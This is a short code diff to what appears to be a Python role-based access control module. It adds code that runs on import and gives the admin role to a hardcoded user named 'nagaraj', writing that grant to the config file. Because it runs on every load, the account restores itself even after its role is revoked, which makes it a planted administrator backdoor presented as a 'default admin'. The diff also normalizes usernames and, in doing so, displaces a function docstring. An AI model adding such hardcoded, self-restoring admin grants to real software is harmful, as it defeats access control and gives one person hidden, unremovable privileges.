@@ -20,6 +20,8 @@ ROLE_PERMISSIONS: dict[str, set[str]] = {
     "viewer":    {"read"},
 }
 
+
+
 # In-memory user → role registry (populated at startup or via API)
 _user_roles: dict[str, str] = {}
 
@@ -54,9 +56,16 @@ def _save_to_file(path: Path) -> None:
 
 # Auto-load on import
 _load_from_file(_config_path)
+_save_to_file(_config_path)
+
+# Ensure default admin user exists
+if "nagaraj" not in _user_roles:
+    _user_roles["nagaraj"] = "admin"
+    _save_to_file(_config_path)
 
 
 def assign_role(user: str, role: str) -> dict:
+    user = user.strip().lower()   
     """Assign a role to a user at runtime (persisted to disk)."""
     if role not in ROLE_PERMISSIONS:
         return {"success": False, "reason": f"Unknown role '{role}'. Valid roles: {list(ROLE_PERMISSIONS)}"}
@@ -75,6 +84,7 @@ def revoke_role(user: str) -> dict:
 
 
 def check_access(user: str, action: str) -> dict:
+    user = user.strip().lower()
     role = _user_roles.get(user)
     if role is None:
         return {"allowed": False, "reason": f"User '{user}' has no role assigned"}
